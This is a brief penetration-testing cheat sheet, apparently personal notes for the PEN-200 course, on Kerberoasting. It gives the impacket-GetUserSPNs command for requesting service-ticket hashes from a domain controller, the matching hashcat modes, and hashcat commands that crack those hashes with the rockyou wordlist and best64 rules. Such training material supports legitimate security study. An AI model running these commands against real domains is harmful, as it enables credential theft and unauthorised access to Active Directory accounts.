---
tags:
---
# GetUserSPNs

Queries target domain for SPNs that are running under a user account ([Kerberoasting](https://www.youtube.com/watch?v=-3MxoxdzFNI))

## Capabilities

```bash
# Get User SPNs and pull a TGS_REP hash
impacket-GetUserSPNs -request -dc-ip $IP -outputfile hashes.kerberoast $DOMAIN/$USER
```

Crack a `TGS_REP` hash in hashcat

```
kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```

```bash
# Kali
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Host
.\hashcat.exe -m 13100 hashes\pen-200\hashes.kerberoast wordlists\rockyou.txt -r rules\best64.rule --force
```
